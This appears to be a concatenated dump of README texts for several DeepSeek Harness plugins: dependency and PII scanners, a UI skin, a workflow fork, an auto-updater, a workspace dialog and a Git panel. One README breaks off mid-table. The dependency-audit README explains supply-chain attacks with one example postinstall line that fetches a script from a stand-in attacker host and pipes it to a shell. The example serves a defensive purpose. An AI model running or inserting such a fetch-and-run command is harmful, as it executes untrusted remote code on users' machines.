# @deepwhale-cn/dsh-dep-audit

[![Listed on dsh-plugin.org](https://dsh-plugin.org/badges/listed.svg)](https://dsh-plugin.org/plugins/feely0208/dsh-dep-audit)


**防供应链攻击与恶意依赖**：装包即执行的脚本、过宽版本、非 registry 来源，都在这一条命令里查完。

**关键词**：依赖投毒 · 供应链攻击 · 恶意依赖 · npm 投毒 · postinstall 脚本 · 供应链安全 · 依赖审计
**Keywords**: dependency poisoning · supply chain attack · malicious package · npm supply chain · postinstall script
**依赖投毒与风险** —— 装包即执行的脚本、过宽版本、非 registry 来源。

## 不装它会怎样

你 `npm install` 了一个看起来正常的包。

它的 `postinstall` 脚本里有一行 `curl evil.example/x.sh | sh` ——
**在你装它的那一刻就执行了**，你甚至没在代码里 import 过它。

近年的大规模 npm 投毒事件（event-stream、ua-parser-js、node-ipc、colors/faker）**全是这条路**。

## 它查什么

| 级别 | 内容 |
|---|---|
| 🔴 高 | 依赖带 install/postinstall 脚本 |
| 🟡 中 | 没有 lockfile · 版本用 `*`/`latest` · git/http 来源 |
| 🟢 低 | `>=x.y.z` 无上界 |

## 安装

```bash
dsh plugin --profile web add @deepwhale-cn/dsh-dep-audit
# 或纯 CLI
npx @deepwhale-cn/dsh-dep-audit
```

## 用法

```bash
dsh-dep-audit                 # 扫当前目录
dsh-dep-audit --demo          # 看检出效果
dsh-dep-audit --html r.html   # HTML 报告
```

![dsh-dep-audit 检查报告示例](https://www.deepwhale.org.cn/plugin-assets/dsh-dep-audit/report.png)

![dsh-dep-audit 演示模式输出](https://www.deepwhale.org.cn/plugin-assets/dsh-dep-audit/demo.png)

![dsh-dep-audit 规则与依据](https://www.deepwhale.org.cn/plugin-assets/dsh-dep-audit/rules.png)

## 边界

- **带 install 脚本 ≠ 恶意** —— `esbuild`/`sharp`/`puppeteer` 这类必须有，已在白名单里。
  报出来的需要你人工确认。
- **不查 CVE 漏洞库**、**不做包名相似度检测**（typosquat 误报率高）。

本插件是一个工具。使用者必须遵守所在地区法律法规，**对使用本项目造成的任何后果自行承担责任。**

# @deepwhale-cn/dsh-data-scan

[![Listed on dsh-plugin.org](https://dsh-plugin.org/badges/listed.svg)](https://dsh-plugin.org/plugins/feely0208/dsh-data-scan)


**防数据泄露**：扫出代码与配置里的身份证、银行卡、手机号 —— 带校验位验证，不误报。

**关键词**：敏感数据 · 个人信息 · 身份证号 · 银行卡号 · 手机号 · 数据泄露 · 隐私数据 · 个人信息保护法 · PII
**Keywords**: sensitive data · PII · personal information · ID card · bank card · phone number · data leak
**敏感数据发现** —— 扫出代码和配置里的身份证、银行卡、手机号。

**带校验位验证**，不是纯正则。

## 不装它会怎样

你为了调试方便，把一段**真实的用户数据**放进了测试文件，然后提交了。

仓库后来开源了。三个月后有人告诉你：**那批身份证号能被搜到**。

这个检查跑一次几秒钟。

## 它查什么

| 级别 | 类型 | 校验 |
|---|---|---|
| 🔴 高 | 身份证号 | GB 11643-1999 **加权校验位** |
| 🔴 高 | 银行卡号 | **Luhn 算法** |
| 🟡 中 | 手机号 | 号段 + **边界断言** |
| 🟢 低 | 邮箱 | 结构匹配（提示性质）|

## 为什么值得用（不是「正则扫一遍」）

纯正则会误报一堆：订单号、时间戳、版本号、哈希片段都像。
被误报烦几次你就不会再用这个工具了。

本工具做**结构 + 校验位**双重验证：

```
✅ 11010519491231002X   身份证，校验位对
❌ 11010519491231003X   校验位错 → 不报
✅ 4532015112830366     卡号，Luhn 过
❌ 4532015112830367     改一位 → 不报
❌ 138123456789012345   像手机但 18 位 → 不报
```

## 输出永不含原值

只报「文件:行 + 类型 + 打码片段」。**记原值等于让扫描工具自己成为泄露源。**

## 安装

```bash
dsh plugin --profile web add @deepwhale-cn/dsh-data-scan
# 或纯 CLI
npx @deepwhale-cn/dsh-data-scan
```

## 用法

```bash
dsh-data-scan                 # 扫当前目录
dsh-data-scan --demo          # 看检出效果
dsh-data-scan --html r.html   # HTML 报告
```

![dsh-data-scan 检查报告示例](https://www.deepwhale.org.cn/plugin-assets/dsh-data-scan/report.png)

![dsh-data-scan 演示模式输出](https://www.deepwhale.org.cn/plugin-assets/dsh-data-scan/demo.png)

![dsh-data-scan 规则与依据](https://www.deepwhale.org.cn/plugin-assets/dsh-data-scan/rules.png)

## 边界

- **不扫二进制/图片** —— 截图里的身份证、PDF 里的表格扫不到。
- **不查 .git 历史** —— 只看到当前工作区，已提交过的需另做历史清理。
- 与 [dsh-bundle-cn-skills](https://github.com/feely0208/dsh-bundle-cn-skills) **不重叠**：那个查密钥，这个查个人信息。

本插件是一个工具。使用者必须遵守所在地区法律法规，**对使用本项目造成的任何后果自行承担责任。**

---

## 深鲸网安守护系列（共 31 个）

> 一个插件做一件事。**安全问题是链式的** —— 配套用才完整。

**国内合规** ｜ [等保对照](https://github.com/feely0208/dsh-cn-mlps) · [日志留存](https://github.com/feely0208/dsh-cn-log-retention) · [备案公示](https://github.com/feely0208/dsh-cn-filing) · [用户同意](https://github.com/feely0208/dsh-consent-guard) · [个人信息权利](https://github.com/feely0208/dsh-data-rights) · [未成年人保护](https://github.com/feely0208/dsh-minor-guard) · [影响评估](https://github.com/feely0208/dsh-pipia) · [数据分类分级](https://github.com/feely0208/dsh-data-classify) · [算法备案](https://github.com/feely0208/dsh-algorithm-filing) · [数据出境](https://github.com/feely0208/dsh-cn-data-export) · [国密合规](https://github.com/feely0208/dsh-cn-crypto) · [AI 内容标识](https://github.com/feely0208/dsh-cn-ai-labeling)

**AI 与 Agent 治理** ｜ [AI 输出信任](https://github.com/feely0208/dsh-ai-output-trust) · [外部内容信任](https://github.com/feely0208/dsh-content-trust) · [MCP 安全](https://github.com/feely0208/dsh-mcp-audit) · [Agent 权限](https://github.com/feely0208/dsh-agent-scope) · [策略核对](https://github.com/feely0208/dsh-agent-policy) · [可疑指令](https://github.com/feely0208/dsh-phishing-guard)

plugins.description: 一个模仿IOS液态玻璃的DeepSeek Harness插件
plugins.readme_text:
# iOS 液态玻璃（iOS Liquid Glass）

给 DeepSeek Harness 的液态玻璃皮肤：一层自绘的静态雾场铺在最底下，整窗只磨一次，三栏都透明叠在上面——所以左边栏和对话区永远是同一个背景。

![浅色](preview/light.jpg)

## 特性

- **一个背景**：顶部纯白、中段转灰、底部一抹淡蓝（`#4d6bfe`），整窗共用，左右不会出现色差。
- **一层磨砂**：`[data-dsh-frame]::before` 上一次 `blur(40px) saturate(160%)`，玻璃质感来自这一层，而不是更白的底色。
- **悬浮侧栏**：24px 圆角、22% 白纱、`blur(40px)`、细描边与投影；卡片本身几乎透明，透出背后的光。
- **气泡与景深**：一条回复一张气泡（18px 圆角、轻投影），你发的消息带向上投影，两者都压在底部蓝色之上。
- **克制的实心表面**：代码块、输入框、菜单/弹窗/toast 是仅有的几处实心面，保证可读性。
- **浅深两套**：跟随 `body[data-ds-dark-theme]` 自动切换，不需要 JavaScript 监听。

## 安装

### 皮肤中心

把仓库作为皮肤目录安装，或复制到 `~/.dsh/skins/ios-liquid-glass`，然后在皮肤中心启用。

### 作为客户端插件

```bash
dsh plugin add github:liushuchang-2012/dsh-skin-liquid-glass
npm install github:liushuchang-2012/dsh-skin-liquid-glass   # 也可以走 npm
npm uninstall dsh-skin-liquid-glass                          # 卸载
```

### 本地开发

```bash
node scripts/build.mjs            # 重新生成 client.js
node scripts/build.mjs --check    # CI：client.js 是否过期
node --test tests/*.test.mjs      # 17 项校验
```

## 配置

- **背景遮挡**：皮肤中心里的滑杆，0 时最透，100 时面板补到近实底。
- **开关**：`localStorage["dsh-skin-liquid-glass.enabled"] = "0" | "1"`，或插件导出的 `setEnabled(bool)`。

## 兼容性与限制

- 只在 Windows 桌面端实测；macOS / Linux 未测试。
- 皮肤靠 `[class*="_suffix"]` 与 CSS 变量匹配，shell 改类名时可能要跟着改。
- CSS 在应用启动时加载，改完要重启 DSH 才生效。

## 验证

`node --test tests/*.test.mjs` 共 17 项：构建产物与模板一致、两份样式表每个声明单行（皮肤中心按行克隆，换行会截断样式）、模拟克隆后 Chrome 仍能解析、manifest 与发布文件清单正确。

## 目录结构

```
skin.css      令牌层（颜色、圆角、字体）
patches.css   材质层（背景、磨砂、侧栏、气泡、浮层）
src/          client.js 模板
scripts/      build.mjs
tests/        17 项校验
preview/      截图
```

## 许可

MIT

plugins.description: Drop-in enhanced fork of the official @deepseek-ai/dsh-tool-workflow: persisted saved-workflow library (workflow_save/list/get/delete/run_saved) over ctx.storageDomain. 官方 workflow 工具增强版：saved workflow 持久库
plugins.readme_text:
# dsh-tool-workflow-plus **官方 workflow 工具的 drop-in 增强 fork —— 补上 saved workflows，让编排脚本可以存下来、下次直接跑。** [![npm version](https://img.shields.io/npm/v/dsh-tool-workflow-plus)](https://www.npmjs.com/package/dsh-tool-workflow-plus) [![npm downloads](https://img.shields.io/npm/dt/dsh-tool-workflow-plus)](https://www.npmjs.com/package/dsh-tool-workflow-plus) [![license](https://img.shields.io/npm/l/dsh-tool-workflow-plus)](./LICENSE) [![node](https://img.shields.io/node/v/dsh-tool-workflow-plus)](./package.json) ![dsh](https://img.shields.io/badge/dsh-%3E%3D0.2.0--rc.2-blue)
官方 [`@deepseek-ai/dsh-tool-workflow`](https://www.npmjs.com/package/@deepseek-ai/dsh-tool-workflow) 的模型面（参数 schema、run 生命周期、会话事件、UI 折叠）从 0.2.1-alpha.2 逐字移植，增量只有一件事：**官方 README 明确写着 "No saved or nested workflows — caller-supplied scripts only"，本插件补上持久化的 saved workflow 库**——模型把跑通过的编排脚本存入库，下次会话一行 `workflow_run_saved` 带新参数直接复跑，不用重发整段脚本。 ## ✨ 特性一览 - **saved workflow 库**：`workflow_save` / `workflow_list` / `workflow_get` / `workflow_delete` / `workflow_run_saved` 五件套，存取删跑全闭环； - **零配置持久化**：走官方 storage 子系统的 domain KV（自有域 `workflow_saved`，per-record 文档），标准部署默认路由 json backend，装上即用； - **与引擎同口径的保存期校验**：meta 形状逐条对齐引擎的 META_INVALID 规则，脚本拒绝携带 `export const meta` 块——不会出现"存得进、跑不起来"的记录； - **官方 UI 无缝折叠**：发起的 run 写入与官方同名的 `tool-workflow/*` durable 会话事件，`dsh-client-ui-workflow-run` 照常渲染； - **让位纪律**：官方工具已占住 `workflow` 名时 fork 自动让位（纯增量共存）；存储栈缺失时 saved 工具调用报错点名缺失件，激活永不失败； - **后台执行**：`workflow_run_saved` 支持 `run_in_background`，与官方同款 job 语义（job 输出环实时镜像进度）。 ## 📦 安装 ```bash # Git Bash dsh plugin add dsh-tool-workflow-plus ``` 或在 profile 的 bundle 依赖里加入 `dsh-tool-workflow-plus` 后重载。 ## 🚀 快速开始 安装后模型会多出六个工具。典型的一次闭环： **第一次跑通后存入库**（模型视角）： > **workflow_save** > > ```json > { > "meta": { > "name": "code-audit", > "description": "对一批文件做审计，再做一轮对抗校验", > "whenToUse": "用户要求大范围代码审计时", > "phases": [{ "title": "scan" }, { "title": "verify" }] > }, > "script": "const files = args.files\nconst found = await pipeline(files,\n f => agent(`审计 ${f}，输出问题列表`, { phase: 'scan' }),\n (issues, f) => agent(`对抗校验：${JSON.stringify(issues)}`, { phase: 'verify' })\n)\nreturn found" > } > ``` > > → `{"kind":"saved","name":"code-audit","overwritten":false,"scriptChars":214,...}` **之后的任何会话，一行复跑**： > **workflow_run_saved** `{ "name": "code-audit", "args": { "files": ["src/a.ts", "src/b.ts"] } }` 模型每次调用都能看到工具描述里的使用纪律：写长脚本前先 `workflow_list` 查库，跑通了就 `workflow_save`。同名再存默认拒绝，`overwrite: true` 才覆盖（保留原始 `createdAt`）。 ## 🧰 工具面 | 工具 | 作用 | | --- | --- | | `workflow` | fork 本体，与官方等价；description 末尾追加 saved 库纪律。与官方共存时自动让位 | | `workflow_save` | 存 `{meta, script}`，key = `meta.name`；同名冲突默认拒绝 | | `workflow_list` | 列出全部（名称/描述/whenToUse/phases/脚本大小，按更新时间倒序，不含脚本体） | | `workflow_get` | 取完整记录（含脚本），供审阅、修改后重存 | | `workflow_delete` | 按名删除 | | `workflow_run_saved` | 用存的脚本 + meta 启动引擎，注入新 `args`；支持 `run_in_background` | 参数细节与官方 `workflow` 工具一致：脚本契约是裸 JS body（无文件系统/网络/Node API，hook 用法见官方工具描述），`meta` 是纯 JSON 数据，`args` 作为 `args` 全局注入脚本。 ## ⚙️ 配置 patch 行 `config`，全部可选，未知键启动即报错（不会静默忽略）： | 键 | 默认 | 说明 | | --- | --- | --- | | `toolName` | `'workflow'` | fork 本体的注册名；想与官方并存两个工具时改掉 | | `savedTools` | `true` | 是否注册 saved 五件套 | | `enableRunInBackground` | `true` | `run_in_background` 开关（fork 与 `workflow_run_saved` 共用；需 `ctx.jobs`） | | `maxResultChars` | `50000` | 渲染结果截断上限 | ## 🗄 存储与持久化 - 自有域 `workflow_saved`（单表 `workflows`，`per-record` layout，每条一个文档——脚本大、可单条清理）； - record：`{ meta, script, createdAt, updatedAt }`（zod strict，坏记录整库拒绝打开——saved 脚本是用户资产，不是可丢弃的派生缓存）； - 标准 base bundle（`backend: json`）下落在 `dshHomePath('storages')`，跨会话存活； - 没挂 storage 三件套的部署：激活不受影响，saved 工具调用返回点名缺失件的错误。 ## 🤔 什么时候用 / 什么时候不用 **适合**： - 你反复让模型写相似的多 agent 编排脚本，希望"跑通一次、存下来、以后复用"； - 你想把官方 workflow 工具换成带 saved 库的版本（drop-in 接管，见下节）； - 你的部署本来没挂官方 workflow 插件，想要一个行为等价 + 带库的版本。 **不适合**： - 需要可视化编排、治理、恢复等重型能力——那是 [`omdsh-dev/dsh_workflow`](https://github.com/omdsh-dev/dsh_workflow)、`dsh-harness-one` 这类独立 workflow 层的领域，本插件刻意不碰； - 只想要固定模板素材、不需要模型运行时写入——[`dsh-workflow-templates`](https://github.com/988hj7tczd-oss/dsh-workflow-templates)（12 个内置模板，明确让位官方工具）更轻； - 多个 saved workflow 同时大批量运行——存储域只管"存"，并发调度仍由引擎与 `ctx.jobs` 的既有语义决定。 ## 🔀 与官方工具的关系 默认**共存**：patch 行只插入本插件。官方已占住 `workflow` → fork 让位（warn 一行），本插件是纯增量的 saved 库，官方工具照常工作；官方不在（headless/sdk 等组合）→ fork 以 `workflow` 之名上线。 想让 fork **接管** `workflow` 名（模型看到的是带 saved 库提示的版本），在 profile patch 里追加： ```yaml - id: tool-workflow disabled: true ``` > 注意：web/desktop 部署的官方行可能声明在 **agent preset 组内**，profile patch 够不着那种行（与 dsh-tool-todo-plus 的结论一致）。这种部署保持共存即可——`workflow_run_saved` 复用同一引擎，与官方工具完全等价。 ## ❓ FAQ **saved 工具调用报 "saved workflow storage unavailable"？** 部署没挂 storage 栈。加载 `@deepseek-ai/dsh-storage` + 一个 kv backend（`dsh-storage-json` 或 `dsh-storage-sqlite`）+ `@deepseek-ai/dsh-storage-domain`（标准 base bundle 默认全有）。 **日志里有 "tool "workflow" is already registered — standing by"？** 正常让位行为：官方 tool-workflow 已注册了 `workflow`，本插件只上线五件套。想接管看上一节；或把 `toolName` 改成别的名字并存。 **`workflow_save` 报 "already saved"？** 同名工作流已存在且未带 `overwrite: true`。先 `workflow_get` 看看现存版本，确认要覆盖再显式传 `overwrite: true`——库不会让你误删别人的版本。 **npm 页面上的 README 和 GitHub 不一致？** npm 页面展示的是发布时打进 tarball 的 README。GitHub 上的更新要等下一个 npm 版本才会在 npm 页面生效。 **脚本里的 `export const meta` 为什么不让存？** 工具契约是"裸 JS body + meta 作为 JSON 参数"，引擎对带 meta 块的脚本会 SCRIPT_PARSE。存一条永远跑不起来的脚本没有意义，保存期就拦下。 ## 🛠 开发 ```bash # Git Bash（仓库根目录） npm install npm run build # tsc 类型检查 + esbuild bundle（--packages=external，产物只含第一方代码） npm test # vitest，55 用例 npm run smoke # 构建产物 + 打桩宿主的端到端冒烟 ``` 发布：`npm publish` 由维护者本人执行（2FA/EOTP）。 ## License MIT

plugins.description: Scheduled idle-gated auto-update for DeepSeek Harness: DSH itself + installed plugins. Four schedule modes, bidirectional whitelist, web panel.
plugins.readme_text: # dsh-autoupdater **Auto-update plugin for DeepSeek Harness (DSH)** — 定时检查 DSH 本体与已安装插件的更新，只在无人使用的空闲窗口执行。四种调度模式、双向白名单、可视化设置面板。 English below · [English](#english) ## 功能 - **定时检查**：四种调度模式任选——每日 HH:MM / 每 N 小时（整点对齐）/ 每 N 天 / 每 N 分钟 - **空闲门槛**：会话日志 2 分钟无写入 + 无运行中 Agent 才动手；定时触发再叠加持续静默采样，绝不打断使用 - **插件批量更新**：遍历已安装插件，逐个对比 npm 最新版并升级（带 `包名@版本` 显式安装 + 磁盘回读验证，杜绝假更新） - **双向白名单**：白名单内只提醒 / 白名单内自动升级，两种语义随你切换 - **DSH 本体更新**：三种策略——不管 / 只暂存+通知 / 通知后宽限自动重启（宽限期内任何会话活动即推迟） - **Web 设置面板**：插件管理器内嵌卡片，改配置保存即生效（热配置，无需重启） - **最近活动日志**：每次检查/更新/重启都有可读记录，面板内直接查看 - **防变砖检查**：本体更新后校验 dsh 二进制存在才重启，npm 中断不留半更新状态 ## 安装 ```sh dsh plugin --profile web add dsh-autoupdater ``` 或从 GitHub： ```sh dsh plugin --profile web add github:/dsh-autoupdater ``` 安装后重启 DSH（systemd 环境：`sudo systemctl restart <你的dsh服务名>`），然后在 **插件管理器 → 自动更新** 卡片配置。 ## 配置 面板可改全部配置并即时生效；以下为 `cordis.patch.yml` 初始值： | 字段 | 默认值 | 说明 | | --- | --- | --- | | `scheduleMode` | `daily` | `daily` / `everyHours` / `everyDays` / `everyMinutes` | | `dailyTime` | `"04:30"` | 每日 / 每 N 天模式的锚定时刻 | | `everyHours` | `6` | 每 N 小时（整点对齐，1–168） | | `everyDays` | `1` | 每 N 天（锚定 dailyTime，1–365） | | `everyMinutes` | `60` | 每 N 分钟（1–10080） | | `idleSeconds` | `300` | 判定无人使用的持续静默秒数 | | `idleTimeoutMinutes` | `120` | 每次检查等待空闲的最长时间 | | `harnessMode` | `notify` | `off` / `notify`（暂存+通知）/ `auto`（宽限后自动重启） | | `graceMinutes` | `30` | auto 模式通知后的宽限分钟数 | | `systemdUnit` | `""` | 重启用的 systemd 服务名；空 = 从 cgroup 自动探测 | | `pluginMode` | `regexmode-ignore` | 白名单内只提醒其余自动 / 白名单内自动其余提醒 / 全自动 / 全提醒 / 关闭 | | `whitelist` | `[]` | 插件包名列表，含义随 pluginMode | ## 空闲判定原理 1. **会话日志 mtime**：`$DSH_HOME/sessions` 下任意文件 2 分钟内无写入 = 无进行中的工作（借鉴 [dsh-self-upgrade](https://github.com/raomaiping-hash/dsh-self-upgrade)，比 `agent.status` 可靠——实测 turn 结束后 status 可能停留 `running`） 2. **定时触发**额外要求持续静默 `idleSeconds` 秒，双重采样防瞬时空档误判 3. **手动触发**（面板"立即检查"）只要求此刻无运行中会话——你主动点的，不再等静默 4. 探测失败保守当忙，宁可不更新也不冒险 ## 本体更新的重启方式 - 配置了 `systemdUnit`（或自动探测到）→ `sudo -n systemctl restart `。**前置条件**：你的部署用户已配置该命令的 sudoers 免密，例如： ``` youruser ALL=(ALL) NOPASSWD: /usr/bin/systemctl restart your-dsh-service ``` 未配置免密时 sudo 会失败，日志里如实记录，插件不会反复重试 - 未探测到 systemd → 按原 argv 脱离子进程拉起（兜底） - npm 全局安装后校验 dsh 二进制存在，缺失则**放弃重启**（防变砖） ## 安全模型 - 默认 `harnessMode: notify`——只暂存并通知，重启动作需你显式改为 auto - 空闲门槛不可绕过：面板不提供"忽略空闲"开关 - 更新前后均有磁盘版本校验，结果写入 `~/.dsh/autoupdater/history.jsonl` - API 仅写本地 `config.json`，不触碰系统配置 ## 已知限制 - 插件更新只覆盖声明 `dsh.bundle` 的 npm 形态插件；GitHub 源码安装的插件版本比对不适用 - 本体更新依赖 npm 全局安装形态（git checkout 形态请用 [dsh-updater](https://github.com/GodCC6/dsh-updater)） - 空闲判定基于本机 `$DSH_HOME/sessions` 的文件 mtime，远程会话（SSH 场景）不计入 ## 致谢 设计借鉴了社区同类项目：[dsh-self-upgrade](https://github.com/raomaiping-hash/dsh-self-upgrade)（会话日志 mtime 空闲判定、防变砖校验）、[dsh-updater](https://github.com/GodCC6/dsh-updater)（保守失败语义）、[dsh-auto-update](https://github.com/a1113622001/dsh-auto-update)（stage + 退出后应用架构）。 ## License MIT --- # dsh-autoupdater (English) **Auto-update plugin for DeepSeek Harness (DSH)** — scheduled update checks for DSH itself and installed plugins, applied only in idle windows. - **Four schedule modes**: daily HH:MM / every N hours (aligned to clock) / every N days / every N minutes - **Idle gating**: session-log mtime quiet for 2 minutes + no running agents; scheduled runs additionally require sustained quiet with double sampling - **Bulk plugin updates**: per-plugin npm version comparison with explicit `name@version` install and post-install disk verification (no phantom updates) - **Bidirectional whitelist**: whitelist-notified-others-auto, or the reverse - **Harness update strategies**: off / stage+notify (default) / notify then auto-restart after a grace period where any session activity defers it - **Web settings panel** embedded in the plugin manager; hot-reload config — changes apply without restart - **Activity log**: every check, update, and restart recorded and viewable in the panel - **Brick protection**: verifies the dsh binary exists after npm install before restarting Install: `dsh plugin --profile web add dsh-autoupdater`, then restart DSH and configure under **Plugin Manager → dsh-autoupdater**. See the Chinese sections above for full details — the configuration table and idle-detection notes apply to both languages.

# dsh-workspace-create-dialog

[English](README.md) | [中文](README.zh.md)

A **Create Workspace** dialog for [DeepSeek Harness](https://github.com/deepseek-ai/deepseek-harness): type a name and go, or pick a folder with a chooser that finally remembers where you were.

![The Create Workspace dialog: a name field, a workspace folder row with a Choose folder button, and a New workspace location row with a Change button](docs/create-workspace.png)

## What it does

Clicking **Add workspace…** in DSH today opens the OS folder dialog immediately. This plugin replaces that with a small dialog that asks two independent questions: what is the workspace called, and where does it live. Answer the first only and it creates the folder for you; answer the second and the folder you picked *is* the workspace.

| You do | You get |
| --- | --- |
| Type a name, press **Create** | A new folder with that name is created under **New workspace location**, registered as a workspace, and a session opens in it |
| Click **Choose folder…** | The native Windows folder dialog, starting **where you left off**, not at some default |
| Choose a folder, leave the name empty | The name fills itself in from the folder's own name |
| Choose a folder, having typed a name | Your name wins — the workspace is registered, then renamed to it |
| Click **Change…** on New workspace location | Pick where name-only workspaces go from now on; the choice is saved and survives restarts |
| Cancel / Esc / click the backdrop | Nothing happens — no folder, no registration |

### The effect, before and after

| | Before | After |
| --- | --- | --- |
| Creating `my-project` | Create the folder in Explorer first, then hunt for it in the picker | Type `my-project`. Done |
| The folder picker's starting point | The OS default, every single time | The directory you last chose |
| Where new workspaces land | Wherever you navigate to | A location you set once, visible in the dialog, changeable any time |
| Naming a workspace after its folder | Retype the folder name | Auto-filled |

## Install

### From the DSH UI (simplest)

Sidebar → **Plugins** → **Add plugin**, paste this address, click **Install**, then **Enable now**:

```text
https://github.com/LanFeng97/dsh-workspace-create-dialog
```

That box takes a package name, a Git address, a tarball or a local absolute path. A repository URL works because this package ships a `dsh.bundle` patch — DSH checks exactly that before it installs. Restart DeepSeek Harness if the plugin does not come up.

Two things worth knowing: it downloads straight from GitHub, so GitHub has to be reachable (the China-mirror option only covers registry packages, not repository downloads); and DSH does not auto-update third-party plugins yet — upgrading means uninstall + install again.

> Already installed with `tools/install.mjs` below? Run `node tools/install.mjs --uninstall` first, so the profile does not end up with two loader rows for the same id.

### One-line prompt for your agent

If you would rather not click through it:

```text
Install the DSH plugin at https://github.com/LanFeng97/dsh-workspace-create-dialog into my DSH and tell me when to restart.
```

### From the plugin market (once listed)

Search for **dsh-workspace-create-dialog** in [dshmarket](https://github.com/dsh-market/dsh-market) and install it in one click. The listing is [pending a PR](contrib/awesome-dsh-plugin/) to [awesome-dsh-plugin](https://github.com/awesome-dsh-plugin/awesome-dsh-plugin) (their CI requires the repository to be at least one day old); until it lands, use the routes above and below.

### Manual install from this repository

```sh
git clone https://github.com/LanFeng97/dsh-workspace-create-dialog
cd dsh-workspace-create-dialog
node tools/install.mjs
```

That copies the package into your DSH profile's `node_modules` and appends one loader line to the profile's `cordis.patch.yml`. It resolves your DSH home the same way the harness does — explicit config, then `$DSH_HOME`, then `~/.dsh`.

**Then restart DeepSeek Harness** (the host half is a Node module, so a config reload alone will not import it). After that, changing `lib/client.js` only needs a page refresh; changing `lib/index.js` still needs a restart.

`node tools/install.mjs --dry-run` prints what it would do without writing anything; `--uninstall` removes the package and its loader row again.

Publishing to npm is **not** required: the market installs from GitHub exactly the same way, and listing is unaffected either way.

## How it works

### It uses the official extension point, not a patch

`@deepseek-ai/dsh-client-ui-workspace` declares a `single` slot where the "pick a directory" step is handed to whichever plugin fills it:

```text
sidebar.workspaces.directoryFlow              ← the sidebar's "Add workspace…"
conversation.hero.workspace.directoryFlow     ← the empty-state entry
```

The owner hands the occupant the whole interaction contract:

```ts
interface DirectoryFlowOwnerProps {
  open: boolean                     // a pick is requested
  busy: boolean                     // the owner is adopting the picked path
  onPicked: (path: string) => void  // report the directory; the owner registers it and opens a session
  onCancel: () => void
  onError: (message: string) => void
}
```

This plugin registers its own occupant into both slots at **priority -100**. A `single` slot renders the lowest-priority entry, the shipped native driver sits at `0`, so this dialog wins (two entries at the *same* priority throw, which is the official protection against ambiguity). Removing the loader line from your profile patch restores the stock behaviour exactly.

### Why the folder dialog is built here instead of reused

The desktop app opens its folder dialog from the Electron main process without a starting directory:

```js
// D:\App\DSH\resources\app.asar → lib/main.js
dialog.showOpenDialog(window, { properties: ['openDirectory', 'createDirectory'] })
```

There is no `defaultPath`, which is exactly why the chooser always starts in the same place. A plugin cannot reach that call: the DSH host is a *child process* of Electron. So `lib/pick-folder.js` opens its own `IFileDialog` — a small C# COM interop compiled and run by the **Windows PowerShell 5.1 that ships with Windows**:

- **no dependencies**: no koffi, no PowerShell 7, no native module to publish;
- compilation happens **in memory** (~120 ms per call), so there is no DLL cache to corrupt or lock;
- the one line that matters is `IFileDialog::SetFolder` — the remembered directory as the starting point;
- the dialog runs in a child process, so a native fault cannot take the host down.

The C# method declaration order must match the COM vtable (`Show=3`, `SetOptions=9`, `SetFolder=12`, `SetTitle=17`, `GetResult=20`). Getting it wrong does not error — it just silently does the wrong thing — so a self-test asserts the order.

## Where name-only workspaces are created

The **New workspace location** is resolved in this order (`lib/base-dir.js`, a pure function):

1. **What you set in the dialog** — highest priority; once you change it, it is yours;
2. **`config.baseDir`** from your profile patch — the value used at install time;
3. **The root of your default workspace** — the parent of the workspace whose directory is named `default-workspace` (a name the harness fixes, independent of UI language). New workspaces land next to it. This is the default for a fresh install;
4. **Fallback** — `<Documents>/deepseek-harness`, or `<home>/deepseek-harness` when there is no Documents folder.

The resolved value is written to the state file, so "what it was on first run" is decided once and only you change it afterwards. `config.baseDir` is a seed, not an order.

## HTTP routes

All four are loopback-guarded (loopback socket + loopback `Host` + same-origin marker; `x-forwarded-for` is never trusted) — they create directories and open windows on the host machine, so nothing off-machine may reach them.

| Route | Method | Purpose |
| --- | --- | --- |
| `/api/dsh-workspace-create/config` | GET | Current location + last directory |
| `/api/dsh-workspace-create/base-dir` | POST | `{"

plugins.description: GitMate — a smart Git panel for DeepSeek Harness: diffs, generated commit messages, a commit graph with rewind, and .gitignore generation, plus ten agent tools.
plugins.readme_text:
# GitMate

**A Git panel in the [DeepSeek Harness](https://github.com/deepseek-ai/deepseek-harness) sidebar — plus the same operations as fifteen agent tools.**

Runs anywhere the Harness does: macOS, Linux, and Windows (PowerShell).

Only two things genuinely differ across platforms, and both live on the Host side: **how arguments are quoted** (PowerShell doubles a single quote, a POSIX shell closes-escapes-reopens; chosen by `process.platform`) and **how the environment is passed** (through the shell request's `env` field rather than a POSIX `VAR=value` prefix, which is not a command on Windows). Nothing else is platform-aware: paths go through `node:path`, nothing outside `lib/` is written, and no file needing an executable bit is created. When the sandbox will not start, the advice **names the cause for the platform you are on** (bubblewrap/Landlock on Linux, `sandbox-exec` on macOS, `%TEMP%` on Windows).

English | [中文](README.zh.md)

Review changes, read diffs, stage, commit with a generated message, merge, stash, sync, and rewind history without leaving the panel. Every operation is also a tool the agent can call, so asking in chat works too.

```sh
dsh plugin --profile web add github:alanhaskey/dsh-gitmate
```

Restart DSH once, refresh the page, then open **GitMate** from the sidebar's **+** menu.

> The internal ids (Loader row `dsh-git`, tab key) differ from the package name on purpose: the row id is the key of a config row you may already have, and renaming it would orphan your saved settings.

## Reviewing and committing

- **Four groups** — conflicts, staged, changes, untracked. Each row shows the kind in words, the path, and that file's `+N −M`. Row actions stage, unstage, and discard, with a second click for anything destructive.
- **Diffs like an editor** — two line-number gutters, `+`/`−` markers, tinted rows, and only the changed span of a replaced line marked. Click a file to expand it in place; click again to collapse. Widen the context from 3 lines to 24 when a hunk needs more of the file.
- **One row of list actions**, shown only when they would do something, with the counts in the labels.
- **Amend** — fold the staged changes into the previous commit; leaving the message box empty keeps the existing message.
- **A draggable splitter** between the list and the commit card resizes the message box.
- **A panel that is working says so** — every operation shows a turning indicator and names itself ("Committing…", "Reviewing the staged changes…") instead of only greying its buttons out. It sits with the messages at the foot of the list, above the splitter, so it never covers the commit box.

## AI features

| Feature | What it does |
| --- | --- |
| **Commit message** | Generated from the staged diff. If you have already typed something, the button becomes *Refine draft*: the model keeps your intent and fills in the rest instead of replacing it. |
| **Review before commit** | Reads the staged changes and reports only what would bite — a wrong result, a missed edge case, an unhandled error, a committed secret, debug output left in, a behaviour change with no test. Click a finding to open that file's diff. |
| **Split this commit** | Divides the staged changes into commits that each stand on their own, with a message for each. The plan is a draft you can edit: rewrite any message, merge a group into the one above, remove one, ask for a new plan, commit one group at a time, or commit them all in order. Each commit leaves the other files staged. |
| **Explain a change** | Two to five bullets on what a file's change does, so you can review without reading every line. |
